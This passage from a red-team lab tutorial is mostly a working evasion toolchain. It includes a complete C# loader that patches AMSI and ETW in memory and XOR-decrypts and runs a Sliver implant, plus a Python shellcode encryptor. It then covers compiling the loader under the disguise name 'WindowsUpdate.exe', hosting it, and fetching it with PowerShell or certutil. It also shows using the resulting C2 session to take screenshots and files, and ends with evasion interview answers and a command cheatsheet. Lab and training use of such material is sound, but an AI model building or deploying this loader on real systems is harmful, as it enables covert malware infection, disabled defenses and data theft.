00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
```

These are the raw bytes that will execute on the victim. **Right now, it's not encrypted.**

---

**END OF PART 7.3**

---

# 📖 PART 7.4: Building the Custom Loader (The Magic Part)

**This is the MOST IMPORTANT PART.** We're building the code that:
1. **Bypasses AMSI** (so our code isn't scanned)
2. **Bypasses ETW** (so our activity isn't logged)
3. **Decrypts shellcode** (so Defender can't see it)
4. **Executes shellcode** (runs the Sliver implant)

## 7.4.1: What is a Loader?

A loader is a program that loads and runs OTHER code.

```
WindowsUpdate.exe (Loader)
├── Startup
│   └── Patch AMSI    ← First, disable security
│   └── Patch ETW     ← Then, disable logging
├── Load
│   └── Decrypt shellcode from inside itself
├── Execute
│   └── Run the shellcode
│   └── Shellcode connects to C2
│   └── You get a session
```

**Think of it like a Trojan Horse:**
- The wooden horse = Our loader (looks innocent)
- Greek soldiers inside = Our encrypted shellcode (hidden payload)
- At night, soldiers come out = Shellcode decrypts and runs

## 7.4.2: The Complete C# Loader (Line-by-Line Explanation)

I'll show you the **COMPLETE code**, then explain **EVERY line**.

### Step 7.4.2.1: Create the File

In your terminal (not Sliver), create the loader file:
```bash
nano /tmp/Loader.cs
```
This opens the nano text editor. You'll type/paste code here.

### Step 7.4.2.2: The Complete Loader Code

**Copy and paste this ENTIRE code into nano:**

```csharp
// ============================================================
// LINE 1-8: COMMENTS (Explanation, ignored by computer)
// ============================================================
// ORSUBANK LAB - CUSTOM SHELLCODE LOADER
// This loader does:
// 1. Bypasses AMSI (so our code isn't scanned)
// 2. Bypasses ETW (so our activity isn't logged)
// 3. Decrypts shellcode that's hidden inside it
// 4. Runs the shellcode in memory
// ============================================================

// ============================================================
// LINE 9-11: USING STATEMENTS
// These are like "imports" - telling C# what libraries we need
// ============================================================
using System;                        // Basic C# stuff
using System.Runtime.InteropServices; // Lets us call Windows API

// ============================================================
// LINE 12-15: NAMESPACE AND CLASS
// Just organizational structure, required by C#
// ============================================================
namespace Loader                      // Our project name
{
    class Program                     // Our main class
    {
        // ============================================================
        // LINE 16-52: WINDOWS API DECLARATIONS
        // These tell C# about Windows functions we want to use
        // DllImport = "Load this from a Windows DLL file"
        // ============================================================

        // GetProcAddress: Find a function's address in a DLL
        // We use this to find AmsiScanBuffer so we can patch it
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // LoadLibrary: Load a DLL into memory
        // We use this to load amsi.dll and ntdll.dll
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string name);

        // VirtualProtect: Change memory permissions
        // Memory is normally "read-only", we make it writable to patch
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
            uint flNewProtect, out uint lpflOldProtect);

        // VirtualAlloc: Allocate new memory
        // We allocate memory for our shellcode
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        // CreateThread: Create a new thread to run code
        // We create a thread that runs our shellcode
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // WaitForSingleObject: Wait for thread to finish
        // We wait forever (0xFFFFFFFF) so the program doesn't exit
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // ============================================================
        // LINE 53-57: CONSTANTS
        // Magic numbers Windows uses for memory operations
        // ============================================================
        const uint PAGE_EXECUTE_READWRITE = 0x40;  // Memory can be read, written, AND executed
        const uint MEM_COMMIT = 0x1000;            // Actually allocate the memory
        const uint MEM_RESERVE = 0x2000;           // Reserve address space

        // ============================================================
        // LINE 58-95: AMSI BYPASS FUNCTION
        // This patches AmsiScanBuffer to always return "invalid"
        // ============================================================
        static void BypassAMSI()
        {
            // Try-catch: If anything fails, just continue (don't crash)
            try
            {
                // STEP 1: Load amsi.dll
                // String concatenation (a + m + s + i) avoids detection
                // If we wrote "amsi.dll" directly, Defender might flag it
                IntPtr lib = LoadLibrary("a" + "m" + "s" + "i" + ".dll");

                // STEP 2: Find AmsiScanBuffer function address
                // Again, we split the string to avoid detection
                IntPtr addr = GetProcAddress(lib, 
                    "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");

                // STEP 3: The patch bytes
                // These assembly instructions make the function return immediately
                // 
                // What these bytes mean:
                // 0x31, 0xC0 = XOR EAX, EAX    (Set return value to 0)
                // 0xB8, 0x57, 0x00, 0x07, 0x80 = MOV EAX, 0x80070057 (Set to E_INVALIDARG)
                // 0xC3 = RET                   (Return from function)
                //
                // So the function now does: "Return E_INVALIDARG immediately"
                // AMSI thinks the scan failed, so it lets everything through
                byte[] patch = { 0x31, 0xC0, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                // STEP 4: Make the memory writable
                // The code section is normally read-only (protection against malware)
                // We need to make it writable so we can patch it
                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);

                // STEP 5: Write our patch bytes
                // Marshal.Copy copies bytes from our array into the function's memory
                Marshal.Copy(patch, 0, addr, patch.Length);

                // STEP 6: Restore original protection
                // Not strictly necessary, but good practice
                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);

                // AMSI is now bypassed!
            }
            catch 
            { 
                // If anything fails, silently continue
                // (Don't crash, don't show error)
            }
        }

        // ============================================================
        // LINE 96-130: ETW BYPASS FUNCTION
        // This patches EtwEventWrite to do nothing
        // ============================================================
        static void BypassETW()
        {
            try
            {
                // STEP 1: Load ntdll.dll (where EtwEventWrite lives)
                IntPtr lib = LoadLibrary("n" + "t" + "d" + "l" + "l" + ".dll");

                // STEP 2: Find EtwEventWrite function address
                IntPtr addr = GetProcAddress(lib, 
                    "E" + "t" + "w" + "E" + "v" + "e" + "n" + "t" + "W" + "r" + "i" + "t" + "e");

                // STEP 3: Patch bytes
                // 0x33, 0xC0 = XOR EAX, EAX (return 0 = success)
                // 0xC3 = RET (return immediately)
                byte[] patch = { 0x33, 0xC0, 0xC3 };

                // STEP 4-6: Same as AMSI bypass
                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);
                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);

                // ETW is now bypassed!
            }
            catch { }
        }

        // ============================================================
        // LINE 131-145: XOR DECRYPTION FUNCTION
        // Decrypts our shellcode using XOR
        // ============================================================
        static byte[] XorDecrypt(byte[] data, byte key)
        {
            // Create array to hold decrypted data
            byte[] result = new byte[data.Length];

            // For each byte:
            for (int i = 0; i < data.Length; i++)
            {
                // XOR with key to decrypt
                // If original was encrypted with: encrypted = original XOR key
                // Then: original = encrypted XOR key (XOR reverses itself)
                result[i] = (byte)(data[i] ^ key);
            }

            return result;
        }

        // ============================================================
        // LINE 146-200: MAIN FUNCTION (Entry Point)
        // This is what runs when you double-click the EXE
        // ============================================================
        static void Main(string[] args)
        {
            // ========================================
            // STAGE 1: BYPASS SECURITY
            // ========================================
            // Do this FIRST, before ANYTHING else!
            // If we decrypt shellcode before bypassing AMSI,
            // Defender might scan it and block us!

            BypassAMSI();  // Patch AMSI so our code won't be scanned
            BypassETW();   // Patch ETW so our activity won't be logged

            // ========================================
            // STAGE 2: ENCRYPTED SHELLCODE
            // ========================================
            // THIS IS WHERE YOUR ENCRYPTED SHELLCODE GOES!
            // Replace the placeholder with your actual bytes
            // (We'll generate these in the next section)

            byte[] encryptedShellcode = new byte[] {
                // ╔════════════════════════════════════════════════════════════╗
                // ║  PLACEHOLDER - REPLACE WITH YOUR ENCRYPTED SHELLCODE!     ║
                // ║  Use the Python script to generate these bytes            ║
                // ╚════════════════════════════════════════════════════════════╝
                0x00, 0x00, 0x00, 0x00  // DELETE THIS LINE when adding real shellcode
            };

            // The XOR key we used for encryption
            // MUST match the key you used when encrypting!
            byte xorKey = 0x35;

            // ========================================
            // STAGE 3: DECRYPT SHELLCODE
            // ========================================
            // XOR decrypt the shellcode
            // After this, 'shellcode' contains the original Sliver implant
            byte[] shellcode = XorDecrypt(encryptedShellcode, xorKey);

            // ========================================
            // STAGE 4: ALLOCATE EXECUTABLE MEMORY
            // ========================================
            // We need memory that can be EXECUTED (run as code)
            // Normal memory is just for data, can't run code in it

            IntPtr memAddr = VirtualAlloc(
                IntPtr.Zero,                    // Let Windows choose address
                (uint)shellcode.Length,         // Size = shellcode size
                MEM_COMMIT | MEM_RESERVE,       // Actually allocate it
                PAGE_EXECUTE_READWRITE          // Can read, write, AND execute
            );

            // ========================================
            // STAGE 5: COPY SHELLCODE TO EXECUTABLE MEMORY
            // ========================================
            Marshal.Copy(shellcode, 0, memAddr, shellcode.Length);

            // ========================================
            // STAGE 6: EXECUTE SHELLCODE
            // ========================================
            // Create a new thread that starts at our shellcode
            // This is like creating a new worker that runs our code

            IntPtr hThread = CreateThread(
                IntPtr.Zero,    // Default security
                0,              // Default stack size
                memAddr,        // Start here (our shellcode!)
                IntPtr.Zero,    // No parameters
                0,              // Run immediately
                IntPtr.Zero     // Don't care about thread ID
            );

            // ========================================
            // STAGE 7: WAIT FOREVER
            // ========================================
            // If we don't wait, the program exits and kills our shellcode
            // 0xFFFFFFFF = wait forever (until shellcode exits)

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### Step 7.4.2.3: Save and Exit nano

After pasting the code:
1. Press `Ctrl + O` (that's the letter O, not zero)
2. Press `Enter` to confirm filename
3. Press `Ctrl + X` to exit

### Step 7.4.2.4: Verify the File Was Created

```bash
ls -la /tmp/Loader.cs
```

Should show something like:
```
-rw-r--r-- 1 kali kali 8765 Dec 27 12:30 /tmp/Loader.cs
```

---

**END OF PART 7.4**

---

# 📖 PART 7.5: Encrypting Your Shellcode

Now we encrypt the shellcode so Defender can't recognize it.

## 7.5.1: Why Encrypt?

Defender knows what Sliver shellcode looks like.

If we embed raw shellcode, Defender will scan it and say **"This matches Sliver malware!"**

**Solution:** Encrypt it. Encrypted data looks like random garbage. Defender can't match patterns in garbage.

```
RAW SHELLCODE:
4D 5A 90 00 03 00 00 00 ...  ← Defender: "I recognize this! BLOCKED!"

ENCRYPTED SHELLCODE:
78 6F A5 35 36 35 35 35 ...  ← Defender: "Just random bytes..." ✓
```

## 7.5.2: The Encryption Script (Line-by-Line)

### Step 7.5.2.1: Create the Encryption Script

In your terminal, run:
```bash
nano /tmp/encrypt_shellcode.py
```

### Step 7.5.2.2: Copy This ENTIRE Script

```python
#!/usr/bin/env python3
"""
Shellcode Encryptor for ORSUBANK Lab
Encrypts shellcode using XOR for use with our C# loader.

USAGE:
    python3 encrypt_shellcode.py /tmp/implant.bin 0x35

OUTPUT:
    Prints C# byte array that you paste into Loader.cs
"""

import sys  # For command line arguments

def xor_encrypt(data, key):
    """
    XOR encrypts data with a single-byte key.
    
    How XOR works:
    - Each byte is XORed with the key
    - Original: 0x4D, Key: 0x35, Result: 0x4D XOR 0x35 = 0x78
    - To decrypt: 0x78 XOR 0x35 = 0x4D (back to original!)
    
    XOR is its own inverse, so same operation encrypts and decrypts.
    """
    return bytes([b ^ key for b in data])

def format_csharp_array(data):
    """
    Formats encrypted bytes as a C# array initializer.
    
    Input:  bytes like b'\x78\x6f\xa5...'
    Output: string like "0x78, 0x6F, 0xA5, ..."
    
    We format 15 bytes per line for readability.
    """
    lines = []
    for i in range(0, len(data), 15):
        # Take 15 bytes at a time
        chunk = data[i:i+15]
        # Convert each byte to hex format: 0xFF
        hex_str = ", ".join(f"0x{b:02X}" for b in chunk)
        # Add proper indentation for C#
        lines.append(f"                {hex_str},")
    return "\n".join(lines)

def main():
    # Check command line arguments
    # We need: script name, shellcode file, XOR key
    if len(sys.argv) != 3:
        print("=" * 60)
        print("SHELLCODE ENCRYPTOR")
        print("=" * 60)
        print(f"Usage: python3 {sys.argv[0]} <shellcode_file> <xor_key>")
        print(f"Example: python3 {sys.argv[0]} /tmp/implant.bin 0x35")
        print("=" * 60)
        sys.exit(1)
    
    # Parse arguments
    shellcode_file = sys.argv[1]  # Path to shellcode
    xor_key = int(sys.argv[2], 16)  # XOR key (convert from hex string to int)
    
    # Read the shellcode file
    print(f"[*] Reading shellcode from: {shellcode_file}")
    with open(shellcode_file, 'rb') as f:  # 'rb' = read binary
        shellcode = f.read()
    
    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    print(f"[*] XOR key: 0x{xor_key:02X}")
    
    # Encrypt
    print(f"[*] Encrypting...")
    encrypted = xor_encrypt(shellcode, xor_key)
    
    # Output
    print("\n" + "=" * 60)
    print("COPY EVERYTHING BELOW INTO YOUR Loader.cs")
    print("Replace the placeholder 'encryptedShellcode' array")
    print("=" * 60 + "\n")
    
    print("            byte[] encryptedShellcode = new byte[] {")
    print(format_csharp_array(encrypted))
    print("            };")
    print(f"\n            byte xorKey = 0x{xor_key:02X};")
    
    print("\n" + "=" * 60)
    print("DONE! Now edit /tmp/Loader.cs and paste the above.")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

### Step 7.5.2.3: Save and Exit

1. Press `Ctrl + O` to save
2. Press `Enter` to confirm
3. Press `Ctrl + X` to exit

### Step 7.5.2.4: Make the Script Executable

```bash
chmod +x /tmp/encrypt_shellcode.py
```

## 7.5.3: Running the Encryption Script

### Step 7.5.3.1: Run the Script

Make sure you have the shellcode from Part 7.3!

```bash
python3 /tmp/encrypt_shellcode.py /tmp/implant.bin 0x35
```

**What this does:**
- `/tmp/implant.bin` = Your Sliver shellcode from Part 7.3
- `0x35` = The XOR key (a random number, you can change it)

### Step 7.5.3.2: What You'll See

The output will look something like this:

```
[*] Reading shellcode from: /tmp/implant.bin
[*] Shellcode size: 8234567 bytes
[*] XOR key: 0x35
[*] Encrypting...

============================================================
COPY EVERYTHING BELOW INTO YOUR Loader.cs
Replace the placeholder 'encryptedShellcode' array
============================================================

            byte[] encryptedShellcode = new byte[] {
                0x78, 0x6F, 0xA5, 0x35, 0x36, 0x35, 0x35, 0x35, 0x31, 0x35, 0x35, 0x35, 0xCA, 0xCA, 0x35,
                0x35, 0x8D, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, 0x75, 0x35, 0x35, 0x35, 0x35, 0x35,
                ... (many more lines) ...
            };

            byte xorKey = 0x35;

============================================================
DONE! Now edit /tmp/Loader.cs and paste the above.
============================================================
```

## 7.5.4: Copying the Output into Loader.cs

### Step 7.5.4.1: Open Loader.cs for Editing

```bash
nano /tmp/Loader.cs
```

### Step 7.5.4.2: Find the Placeholder

Use `Ctrl + W` to search. Type:
```
PLACEHOLDER
```
Press Enter. You'll jump to:

```csharp
byte[] encryptedShellcode = new byte[] {
    // ╔════════════════════════════════════════════════════════════╗
    // ║  PLACEHOLDER - REPLACE WITH YOUR ENCRYPTED SHELLCODE!     ║
    // ╚════════════════════════════════════════════════════════════╝
    0x00, 0x00, 0x00, 0x00  // DELETE THIS LINE when adding real shellcode
};
```

### Step 7.5.4.3: Replace the Placeholder

1. **Delete** these lines:
```csharp
// ╔════════════════════════════════════════════════════════════╗
// ║  PLACEHOLDER - REPLACE WITH YOUR ENCRYPTED SHELLCODE!     ║
// ╚════════════════════════════════════════════════════════════╝
0x00, 0x00, 0x00, 0x00  // DELETE THIS LINE when adding real shellcode
```

2. **Paste** the output from the encryption script (the bytes between the curly braces)

Your code should now look like:
```csharp
byte[] encryptedShellcode = new byte[] {
    0x78, 0x6F, 0xA5, 0x35, 0x36, 0x35, 0x35, 0x35, 0x31, 0x35, 0x35, 0x35, 0xCA, 0xCA, 0x35,
    ... (all your encrypted bytes) ...
};
```

### Step 7.5.4.4: Verify the XOR Key Matches

Make sure this line has the same key you used:
```csharp
byte xorKey = 0x35;  // Must match what you used in the Python script!
```

### Step 7.5.4.5: Save and Exit

1. Press `Ctrl + O` to save
2. Press `Enter` to confirm
3. Press `Ctrl + X` to exit

---

**END OF PART 7.5**

---

# 📖 PART 7.6: Compiling the Loader

Now we compile our C# code into a Windows EXE.

## 7.6.1: Installing the Compiler

### What We Need

We need `mcs` - the Mono C# compiler. It can create Windows EXEs from Linux!

### Step 7.6.1.1: Install Mono

```bash
sudo apt update
sudo apt install mono-complete -y
```

This takes a few minutes. Wait for it to finish.

### Step 7.6.1.2: Verify Installation

```bash
mcs --version
```

You should see something like:
```
Mono C# compiler version 6.12.0.182
```

## 7.6.2: Compiling to EXE (Exact Commands)

### Step 7.6.2.1: Compile

```bash
mcs -target:exe -out:/tmp/WindowsUpdate.exe /tmp/Loader.cs
```

**What this means:**
- `mcs` = Mono C# compiler
- `-target:exe` = Create an executable
- `-out:/tmp/WindowsUpdate.exe` = Output file name
- `/tmp/Loader.cs` = Your source code

### Step 7.6.2.2: If You Get Errors

**Error: "cannot find class 'Main'"**
- Check that your `Main` function is inside the `Program` class

**Error: "namespace not found"**
- Make sure `using System;` and `using System.Runtime.InteropServices;` are at the top

**Error about Marshal:**
- Make sure you have the InteropServices using statement

### Step 7.6.2.3: Verify Compilation Succeeded

```bash
ls -la /tmp/WindowsUpdate.exe
```

You should see:
```
-rw-r--r-- 1 kali kali 8523456 Dec 27 13:00 /tmp/WindowsUpdate.exe
```

The file size will depend on your shellcode size.

## 7.6.3: Verifying Your EXE

### Step 7.6.3.1: Check File Type

```bash
file /tmp/WindowsUpdate.exe
```

Output should be:
```
/tmp/WindowsUpdate.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

This confirms it's a Windows executable!

### Step 7.6.3.2: Check for Obvious Problems

```bash
# See the file size
ls -lh /tmp/WindowsUpdate.exe

# Should be several MB (not just a few KB)
# If it's tiny, your shellcode wasn't embedded properly
```

---

**END OF PART 7.6**

---

# 📖 PART 7.7: Hosting the Payload

Now we make the payload downloadable.

## 7.7.1: Using Sliver's Web Server

### Step 7.7.1.1: Go Back to Sliver Console

Find your terminal window running Sliver. You should see:
```
[server] sliver >
```

### Step 7.7.1.2: Host the Payload

Type this command:
```
websites add-content --website orsubank --web-path /update/WindowsUpdate.exe --content /tmp/WindowsUpdate.exe
```

**What this means:**
- `websites add-content` = Add a file to Sliver's web server
- `--website orsubank` = Name of the website (creates if doesn't exist)
- `--web-path /update/WindowsUpdate.exe` = The URL path
- `--content /tmp/WindowsUpdate.exe` = The actual file to serve

### Step 7.7.1.3: Verify

```
websites
```

You should see:
```
 Name     | Port
=================
 orsubank | 443

[orsubank]
 Path                      | Size      | Content-Type
=======================================================
 /update/WindowsUpdate.exe | 8.5 MB    | application/octet-stream
```

## 7.7.2: Your Download URL

The payload is now available at:
```
https://192.168.100.100/update/WindowsUpdate.exe
```

**Anyone who visits this URL will download your payload!**

---

**END OF PART 7.7**

---

# 📖 PART 7.8: Delivering to the Target

Now we get the payload onto the victim's computer (WS01).

## 7.8.1: Delivery Methods

There are several ways to get the victim to download and run our payload.

### Method A: Direct Download Link (Simulating Phishing)

On WS01, open PowerShell and run:

```powershell
# For self-signed certificates (our lab), you may need:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Download the file
Invoke-WebRequest -Uri "https://192.168.100.100/update/WindowsUpdate.exe" -OutFile "$env:USERPROFILE\Desktop\WindowsUpdate.exe" -UseBasicParsing
```

The file is now on the desktop!

### Method B: Using certutil (Windows Built-in Tool)

```cmd
certutil.exe -urlcache -split -f "https://192.168.100.100/update/WindowsUpdate.exe" "%USERPROFILE%\Desktop\WindowsUpdate.exe"
```

### Method C: Browser Download

1. Open Edge/Chrome on WS01
2. Go to: `https://192.168.100.100/update/WindowsUpdate.exe`
3. Accept the certificate warning (click "Advanced" → "Continue")
4. File downloads

## 7.8.2: Executing the Payload

### Step 7.8.2.1: Find the Downloaded File

On WS01, the file should be on the Desktop:
```
C:\Users\vamsi.krishna\Desktop\WindowsUpdate.exe
```

### Step 7.8.2.2: Run It

**Double-click the file.**

Or from PowerShell:
```powershell
& "$env:USERPROFILE\Desktop\WindowsUpdate.exe"
```

Or from Command Prompt:
```cmd
"%USERPROFILE%\Desktop\WindowsUpdate.exe"
```

### Step 7.8.2.3: What You'll See on WS01

**Nothing visible!** The payload runs silently.

The console window might flash briefly or not appear at all. This is intentional.

---

**END OF PART 7.8**

---

# 📖 PART 7.9: Receiving Your Shell

**Go back to your Kali machine now!**

## 7.9.1: What to Expect

### Step 7.9.1.1: Watch the Sliver Console

After about **5-10 seconds** of the victim running the payload, you should see:

```
[*] Session 98a7c2d4 RANDOM_NAME - 192.168.100.20:52847 (WS01) - windows/amd64 - Sat Dec 27 13:15:00

[server] sliver >
```

🎉 **YOU HAVE A SHELL!** 🎉

### Step 7.9.1.2: If You Don't See a Session

Wait 30 seconds. Sliver has a check-in interval.

If still nothing:
- Check the listener is running: `jobs`
- Try running the payload again on WS01
- Check network connectivity: Can WS01 reach Kali?

## 7.9.2: Interacting with Your Session

### Step 7.9.2.1: List Sessions

```
sessions
```

Output:
```
 ID        | Transport | Remote Address    | Hostname | Username          | OS/Arch        
============|===========|==================|==========|==================|================
 98a7c2d4  | http(s)   | 192.168.100.20    | WS01     | ORSUBANK\vamsi... | windows/amd64  
```

### Step 7.9.2.2: Connect to the Session

Copy the session ID and type:
```
use 98a7c2d4
```

Your prompt changes:
```
[server] sliver (RANDOM_NAME) >
```

**You're now inside the session!**

## 7.9.3: Basic Commands

### Who Am I?
```
whoami
```
Output:
```
orsubank\vamsi.krishna
```

### System Info
```
info
```
Output shows:
- Computer name
- OS version
- Architecture
- Domain
- etc.

### Current Directory
```
pwd
```

### List Files
```
ls
```

### Run Shell Command
```
shell
```
This gives you a command prompt:
```
PS C:\Users\vamsi.krishna>
```

Type `exit` to return to Sliver.

### Take Screenshot
```
screenshot
```

### Download a File
```
download C:\Users\vamsi.krishna\Desktop\secret.txt
```

### Upload a File
```
upload /tmp/mytool.exe C:\Users\Public\mytool.exe
```

---

**END OF PART 7.9**

---

# 📖 PART 7.10: Troubleshooting

## Problem: "No session received"

### Check 1: Is the listener running?
```
jobs
```
Should show your HTTPS listener.

### Check 2: Can WS01 reach Kali?

On WS01:
```powershell
Test-NetConnection -ComputerName 192.168.100.100 -Port 443
```

### Check 3: Did the payload run without errors?

Try running from command prompt to see errors:
```cmd
C:\Users\vamsi.krishna\Desktop\WindowsUpdate.exe
```

## Problem: "Defender blocked the file"

Your loader didn't evade properly. Possible causes:
- Shellcode wasn't encrypted properly
- AMSI bypass failed
- File got uploaded to VirusTotal (don't do that!)

**Solution:** Re-check the encryption step and recompile.

## Problem: "Session dies after a few seconds"

Defender might have caught post-exploitation activity.

**Solution:** Be more careful with what commands you run. Avoid obvious things like mimikatz.

## Problem: "Cannot find file" errors

Make sure all paths are correct:
- `/tmp/implant.bin` - Your Sliver shellcode
- `/tmp/Loader.cs` - Your C# source
- `/tmp/WindowsUpdate.exe` - Your compiled loader

## Problem: "Port already in use"

```bash
# Find what's using port 443
sudo lsof -i :443

# Kill it
sudo kill -9 <PID>

# Restart listener in Sliver
https --lhost 192.168.100.100 --lport 443
```

## Problem: "Compilation errors"

Common fixes:
- Make sure `using System;` is at the top
- Make sure `using System.Runtime.InteropServices;` is at the top
- Check that all curly braces `{ }` are balanced
- Make sure the encrypted shellcode bytes are comma-separated

---

# PART 8: REFERENCE MATERIAL

---

# CHAPTER 36: Interview Questions

## Offensive Security / Red Team Interview Questions

### Basic Concepts

**Q: What is shellcode?**
A: Shellcode is position-independent machine code that can be executed directly by the CPU. It typically finds its own API addresses at runtime and performs tasks like creating reverse shells or downloading payloads.

**Q: What is the difference between shellcode and a regular executable?**
A: A regular executable has headers (PE format) and relies on the Windows loader. Shellcode is raw bytes with no headers, can run from any memory location, and must resolve its own API addresses.

**Q: What is a C2 (Command and Control) framework?**
A: A C2 framework is a tool that allows attackers to remotely control compromised systems. It consists of a server (on the attacker machine) and implants/beacons (on victim machines). Examples: Sliver, Cobalt Strike, Metasploit.

**Q: What is the difference between a session and a beacon in C2?**
A: Session maintains a constant connection for real-time interaction. Beacon checks in periodically (e.g., every 30 seconds) and is stealthier due to less network noise.

---

### Windows Defender & Detection

**Q: How does Windows Defender detect malware?**
A: Defender uses three main layers:
1. Signature-based detection - matches file bytes against known malware
2. AMSI - scans scripts and dynamic content at runtime
3. Behavioral analysis/ETW - monitors API calls and suspicious behavior

**Q: What is AMSI and how do you bypass it?**
A: AMSI (Antimalware Scan Interface) is a Windows feature that allows applications to scan content before execution. To bypass it, you can patch the `AmsiScanBuffer` function in memory to return E_INVALIDARG, making AMSI think the scan failed.

**Q: What bytes do you patch AmsiScanBuffer with and why?**
A: Common patch: `0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3` which is assembly for `mov eax, 0x80070057; ret`. This makes the function return E_INVALIDARG immediately, causing AMSI to skip the scan.

**Q: What is ETW and why do attackers care?**
A: ETW (Event Tracing for Windows) is a logging mechanism that security tools use to monitor system activity. Attackers bypass it by patching `EtwEventWrite` to prevent their activities from being logged.

**Q: What DLL contains EtwEventWrite?**
A: `ntdll.dll`

**Q: What DLL contains AmsiScanBuffer?**
A: `amsi.dll`

---

### Encryption & Evasion

**Q: What is XOR encryption and why is it used in malware?**
A: XOR is a simple reversible encryption where applying the same key encrypts and decrypts. It is used to transform malware bytes so signature-based detection cannot recognize them.

**Q: Why is XOR encryption reversible?**
A: Because XOR is its own inverse. If you XOR data with a key twice, you get the original data back: `A XOR K XOR K = A`

**Q: What is the advantage of XOR over AES for shellcode encryption?**
A: XOR is simpler to implement, faster, and sufficient for evading signature detection. AES is overkill when we just need to break byte patterns.

**Q: What is a loader in malware context?**
A: A loader is a program that decrypts and executes shellcode at runtime. It typically allocates executable memory, decrypts the payload, and transfers execution to it.

**Q: Why do we use PAGE_EXECUTE_READWRITE when allocating memory for shellcode?**
A: Shellcode needs to be executed as code (EXECUTE), but we also need to write the decrypted bytes there first (WRITE) and the shellcode may read its own code (READ).

---

### Process Injection

**Q: What is process injection?**
A: Running your code inside another process's memory space. Common techniques include VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.

**Q: Name the four main Windows API calls used for classic process injection.**
A: 
1. `OpenProcess` - get handle to target process
2. `VirtualAllocEx` - allocate memory in target process
3. `WriteProcessMemory` - write shellcode to allocated memory
4. `CreateRemoteThread` - execute the shellcode

**Q: Why would you inject into a process like explorer.exe or svchost.exe?**
A: These processes are always running and blend in with normal system activity. Network connections from them are less suspicious than from unknown executables.

---

### Initial Access Techniques

**Q: What is phishing and how is it used for initial access?**
A: Phishing uses deceptive emails/websites to trick users into downloading and running malicious payloads. Common techniques include malicious attachments, link to payload download, or credential harvesting.

**Q: What ports are commonly used for C2 traffic and why?**
A: Port 443 (HTTPS) and 80 (HTTP) are commonly used because they blend with normal web traffic and are almost never blocked by firewalls.

**Q: What is the difference between staged and stageless payloads?**
A: 
- Stageless: Full payload in single file (larger, but simpler)
- Staged: Small stager that downloads the full payload (smaller initial footprint, but requires additional network traffic)

**Q: What is HTTPS used for in C2 and why is it preferred?**
A: HTTPS encrypts the C2 traffic, making it harder for network security tools to inspect the content. It also blends with normal encrypted web traffic.

**Q: How do you transfer a payload to a target machine?**
A: Common methods:
- PowerShell `Invoke-WebRequest`
- `certutil.exe -urlcache`
- Browser download
- SMB file share
- USB drop

---

### Sliver C2 Specific

**Q: What command generates shellcode in Sliver?**
A: `generate --format shellcode --http <ip:port> --os windows --arch amd64 --save <path>`

**Q: What is the difference between --http and --mtls in Sliver?**
A: `--http` uses HTTP/HTTPS for C2 communication (more common, blends with web traffic). `--mtls` uses mutual TLS authentication (more secure, but distinct traffic pattern).

**Q: How do you start an HTTPS listener in Sliver?**
A: `https --lhost <ip> --lport 443`

**Q: What Sliver command hosts a file on its built-in web server?**
A: `websites add-content --website <name> --web-path <url> --content <file>`

---

### Scenario Questions

**Q: You need to get a shell on a Windows 11 machine with Defender enabled. Describe your approach.**
A: 
1. Generate Sliver shellcode (not EXE)
2. Encrypt shellcode with XOR using a random key
3. Create a C# loader that bypasses AMSI and ETW before decrypting
4. Compile the loader
5. Host on HTTPS server
6. Deliver via phishing/social engineering
7. Loader runs → bypasses defenses → decrypts shellcode → executes → C2 connection

**Q: Your implant gets caught by Defender. What do you change?**
A: 
1. Use a different XOR key
2. Add junk code/delays to change signature
3. Change the order of operations
4. Use a different encryption algorithm
5. Compile with different settings
6. Consider direct syscalls to avoid API hooks

**Q: How would you detect if AMSI bypass worked?**
A: In testing, you can try running known-bad PowerShell commands after your AMSI patch. If they execute without Defender alerts, the bypass worked. In production, successful shellcode execution is proof.

---

# CHAPTER 37: Important Commands Cheatsheet

## Sliver Commands

| Command | Description |
|---------|-------------|
| `https --lhost <ip> --lport <port>` | Start HTTPS listener |
| `generate --http <ip:port> --format shellcode --save <path>` | Generate shellcode |
| `websites add-content --website <name> --web-path <url> --content <file>` | Host a file |
| `sessions` | List sessions |
| `use <id>` | Interact with session |
| `jobs` | List running listeners |
| `whoami` | Current user |
| `shell` | Interactive shell |
| `download <path>` | Download file |
| `upload <local> <remote>` | Upload file |

## Kali Commands

```bash
# Install Sliver
curl https://sliver.sh/install | sudo bash

# Start Sliver
sudo sliver-server

# Install Mono
sudo apt install mono-complete -y

# Compile C#
mcs -target:exe -out:WindowsUpdate.exe Loader.cs

# Encrypt shellcode
python3 encrypt_shellcode.py /tmp/implant.bin 0x35
```

## PowerShell Download

```powershell
# Bypass certificate check
